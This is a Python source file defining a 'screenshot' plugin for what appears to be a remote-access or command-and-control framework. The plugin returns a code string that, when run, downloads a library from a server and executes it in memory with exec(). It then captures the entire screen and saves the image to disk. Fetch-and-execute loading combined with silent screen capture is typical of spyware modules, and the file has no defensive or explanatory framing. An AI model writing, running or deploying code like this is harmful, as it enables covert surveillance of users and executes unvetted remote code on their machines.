from .base import BaseModule

class ScreenshotModule(BaseModule):
    def __init__(self):
        super().__init__()
        self.name = "screenshot"
        self.description = "Capture screen"
        self.author = "admin"
        self.version = "1.0"
        
    def get_code(self):
        return '''
import sys
import importlib.util
import requests
import base64
import os
from datetime import datetime

def load_lib_from_server(lib_name):
    try:
        response = requests.get(f"http://127.0.0.1:8000/libs/{lib_name}.py")
        if response.status_code == 200:
            spec = importlib.util.spec_from_loader(lib_name, loader=None)
            module = importlib.util.module_from_spec(spec)
            sys.modules[lib_name] = module
            exec(response.text, module.__dict__)
            return module
    except Exception as e:
        print(f"Failed to load {lib_name}: {e}")
    return None

def capture():
    try:
        mss = load_lib_from_server('mss')
        if not mss:
            return "Failed to load mss library"
            
        os.makedirs('screenshots', exist_ok=True)
            
        with mss.mss() as sct:
            monitor = sct.monitors[0]
            screenshot = sct.grab(monitor)
            png_bytes = sct.to_png(screenshot.rgb, screenshot.size)
            
            timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
            filename = os.path.join('screenshots', f'screenshot-{timestamp}.png')
            
            with open(filename, 'wb') as f:
                f.write(png_bytes)
            
            return f"Screenshot saved as {filename}"
            
    except Exception as e:
        import traceback
        return f"Screenshot failed: {str(e)}\\n{traceback.format_exc()}"
''' 